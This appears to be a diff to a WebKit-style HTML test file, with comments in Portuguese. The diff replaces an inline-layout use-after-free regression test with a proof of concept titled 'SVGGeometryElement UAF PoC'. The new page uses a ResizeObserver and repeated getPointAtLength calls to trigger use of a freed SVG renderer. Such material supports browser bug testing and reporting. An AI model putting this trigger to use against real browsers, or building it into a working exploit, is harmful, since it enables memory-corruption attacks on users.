@@ -1,75 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8">
-<title>Teste de Regressão: Descarte de nós inline antes do layout (LineLayout UAF)</title>
-<style>
-    .container {
-        width: 100px;
-        font-family: monospace;
-        word-break: break-word;
-        white-space: normal;
-    }
-</style>
+    <meta charset="utf-8">
+    <title>SVGGeometryElement UAF PoC</title>
 </head>
 <body>
-<div id="container" class="container"></div>
-<div id="status">Executando teste...</div>
+    <div id="container">
+        <!-- Elemento SVG alvo -->
+        <svg width="200" height="200">
+            <path id="targetPath" d="M 10,10 L 100,100" stroke="black" fill="none" />
+        </svg>
+    </div>
 
-<script>
-// Função utilitária de GC via alocação recursiva de memória
-function gc() {
-    function gcRec(n) {
-        if (n < 1)
-            return {};
-        var temp = { i: "ab" + i + (i / 100000) };
-        temp += "foo";
-        gcRec(n - 1);
-    }
-    for (var i = 0; i < 1000; i++)
-        gcRec(10);
-}
+    <div id="status" style="font-family: monospace; margin-top: 15px;">Executando...</div>
 
-function runInlineLayoutTest() {
-    const container = document.getElementById("container");
+    <script>
+    const path = document.getElementById('targetPath');
+    const status = document.getElementById('status');
 
-    for (let cycle = 0; cycle < 100; cycle++) {
-        // 1. Cria nós de texto e elementos inline dentro do contêiner
-        const span1 = document.createElement("span");
-        span1.textContent = "palavra1 palavra2 ";
+    try {
+        // 1. Garante que o renderer inicial exista
+        path.getTotalLength();
 
-        const span2 = document.createElement("span");
-        span2.textContent = "texto_para_quebra_de_linha_longo ";
-
-        const span3 = document.createElement("span");
-        span3.textContent = "conteudo extra";
-
-        container.appendChild(span1);
-        container.appendChild(span2);
-        container.appendChild(span3);
-
-        // 2. Remove um nó inline recém-inserido sem acionar layout prévio (!everHadLayout())
-        container.removeChild(span2);
-
-        // 3. Força o cálculo de layout/quebra de linha imediato (LayoutIntegration)
-        // Isso aciona InlineItemsBuilder::populateBreakingPositionCache()
-        const height = container.offsetHeight;
-
-        // 4. Limpa o restante e força descarte
-        container.innerHTML = "";
-
-        if (cycle % 10 === 0) {
-            gc();
+        // 2. Registra um ResizeObserver / Mutation Observer síncrono para mutar a árvore
+        // durante o recálculo forçado de layout
+        if (window.ResizeObserver) {
+            const ro = new ResizeObserver(() => {
+                // Remove o renderer forçando display: none
+                path.style.display = 'none';
+            });
+            ro.observe(path);
         }
-    }
-}
 
-try {
-    runInlineLayoutTest();
-    document.getElementById("status").innerText = "PASS: Layout inline executado sem Heap Use-After-Free.";
-} catch (e) {
-    document.getElementById("status").innerText = "FAIL: " + e.message;
-}
-</script>
+        // 3. Modifica a geometria para sujar o layout (dirty layout)
+        path.setAttribute('d', 'M 0,0 L 500,500');
+
+        // 4. Dispara getPointAtLength que guarda o renderer bruto e chama getTotalLength()
+        // No WebKit vulnerável, a reavaliação de layout dentro de getTotalLength()
+        // destrói o renderer antigo e causa o UAF ao retornar.
+        for (let i = 0; i < 50; i++) {
+            path.style.display = (i % 2 === 0) ? 'inline' : 'block';
+            path.setAttribute('d', 'M 0,0 L ' + (100 + i) + ',100');
+            
+            // Ponto crítico do UAF:
+            path.getPointAtLength(50);
+        }
+
+        status.innerText = "Teste finalizado: Sobreviveu (sem crash).";
+    } catch (e) {
+        status.innerText = "Erro durante execução: " + e.message;
+    }
+    </script>
 </body>
 </html>
